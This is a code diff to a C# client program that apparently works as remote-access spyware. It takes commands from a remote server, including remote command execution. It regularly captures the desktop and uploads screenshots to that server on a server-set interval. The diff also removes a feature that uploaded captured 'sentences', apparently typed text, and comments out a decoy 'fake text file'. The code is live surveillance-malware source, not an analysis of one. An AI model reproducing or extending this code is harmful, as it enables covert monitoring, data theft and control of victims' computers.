@@ -152,7 +152,7 @@ namespace Client
             CreateDirectory(appDir);
             CreateDirectory(dirTransfers);
             CreateDirectory(dirPlugins);
-            // OpenFakeTextFile("Hey!");
+            //OpenFakeTextFile("Hey!");
             Handler.Instance.Transmitter = new Library.Transmitter(URL, APIKEY_PRIVATE, APIKEY_PUBLIC, CONNECTION_TIMEOUT);
             //foo = Handler.Instance.Transmitter.Test(2);
             //foo = Handler.Instance.Transmitter.Test2("bar");
@@ -256,10 +256,10 @@ namespace Client
                 //Handler.Instance.StartExceptionHandling();
                 Handler.Instance.StartDirectoryWatcher();
 
-                Handler.Instance.OnReturn += (o, e) =>
-                {
-                    HandleReturnEvent(e);
-                };
+                //Handler.Instance.OnReturn += (o, e) =>
+                //{
+                //    HandleReturnEvent(e);
+                //};
                 Handler.Instance.OnFileEvent += (o, e) =>
                 {
                     HandleFileEvent(e);
@@ -290,9 +290,6 @@ namespace Client
                             long quality = 80;
                             long.TryParse(Handler.Instance.Transmitter.TSettings.Parameters, out quality);
                             UploadImage(quality);//.ImageQuality);
-                            break;
-                        case ECommand.UPLOAD_SENTENCES:
-                            UploadSentences();
                             break;
                         case ECommand.EXECUTE_COMMAND:
                             ExecuteCommand();
@@ -456,11 +453,17 @@ namespace Client
 
         private void StreamDesktop()
         {
+            var interval = 10000;
+            if(!int.TryParse(Handler.Instance.Transmitter.TSettings.Parameters, out interval))
+            {
+                interval = 10000;
+            }
             streamDesktopTimer = new Timer();
-            streamDesktopTimer.Interval = 1000;
+            streamDesktopTimer.Interval = interval;
             streamDesktopTimer.Tick += (o, e) =>
             {
-                StreamImage();
+                UploadImage(10L);
+                //StreamImage();
                 //CursorInteract();
             };
             streamDesktopTimer.Enabled = true;
@@ -774,25 +777,6 @@ namespace Client
             return false;
         }
 
-        private void UploadSentences()
-        {
-            Handler.Instance.Transmitter.UploadSentences(Handler.Instance.Sentences);
-            //Handler.Instance.Sentences.Clear();
-        }
-
-        private void HandleReturnEvent(string e)
-        {
-            /*if (listBox1.InvokeRequired)
-            {
-                AddSentenceToListCallback d = new AddSentenceToListCallback(HandleReturnEvent);
-                this.Invoke(d, new object[] { e });
-            }
-            else
-            {
-                listBox1.Items.Add(e);
-            }*/
-        }
-
         private void HandleImageEvent(Bitmap e)
         {
             /*if (pictureBox1.InvokeRequired)
@@ -823,28 +807,28 @@ namespace Client
             //File.Delete(zipFile);
         }
 
-        private void StreamImage()
-        {
-            UploadImage(25L);
-            ////Bitmap bitmapImage = ScreenMan.Instance.Grab(true, System.Drawing.Imaging.PixelFormat.Format24bppRgb);
-            ////long screenshotQuality = 35L;// Handler.Instance.Transmitter.TSettings.ImageQuality;
-            ////if (bitmapImage == null)
-            ////    return;
-            //try
-            //{
-            //    //var name = Handler.Instance.Transmitter.GetComputerHash() + ".jpg";
-            //    //var name = "stream.jpg";
-            //    //var file = Path.Combine(Environment.CurrentDirectory, PathExt.ReformatName(name));
-            //    Bitmap img = ScreenMan.Instance.Grab(true, System.Drawing.Imaging.PixelFormat.Format24bppRgb);
-            //    //ScreenMan.Instance.Save(img, file, screenshotQuality);
-            //    //Handler.Instance.Transmitter.UploadImage(name, file);
-            //    ImageConverter converter = new ImageConverter();
-            //    byte[] imgArray = (byte[])converter.ConvertTo(img, typeof(byte[]));
-            //    Handler.Instance.Transmitter.UploadImage(imgArray);//new ImageData() { Image = img, Token = Handler.Instance.Transmitter.Auth.Token });
-            //    //File.Delete(file);
-            //}
-            //catch (Exception ex) { }
-        }
+        //private void StreamImage()
+        //{
+        //    UploadImage(25L);
+        //    ////Bitmap bitmapImage = ScreenMan.Instance.Grab(true, System.Drawing.Imaging.PixelFormat.Format24bppRgb);
+        //    ////long screenshotQuality = 35L;// Handler.Instance.Transmitter.TSettings.ImageQuality;
+        //    ////if (bitmapImage == null)
+        //    ////    return;
+        //    //try
+        //    //{
+        //    //    //var name = Handler.Instance.Transmitter.GetComputerHash() + ".jpg";
+        //    //    //var name = "stream.jpg";
+        //    //    //var file = Path.Combine(Environment.CurrentDirectory, PathExt.ReformatName(name));
+        //    //    Bitmap img = ScreenMan.Instance.Grab(true, System.Drawing.Imaging.PixelFormat.Format24bppRgb);
+        //    //    //ScreenMan.Instance.Save(img, file, screenshotQuality);
+        //    //    //Handler.Instance.Transmitter.UploadImage(name, file);
+        //    //    ImageConverter converter = new ImageConverter();
+        //    //    byte[] imgArray = (byte[])converter.ConvertTo(img, typeof(byte[]));
+        //    //    Handler.Instance.Transmitter.UploadImage(imgArray);//new ImageData() { Image = img, Token = Handler.Instance.Transmitter.Auth.Token });
+        //    //    //File.Delete(file);
+        //    //}
+        //    //catch (Exception ex) { }
+        //}
 
         private int HandleFileEvent(FileSystemEventArgs e)
         {
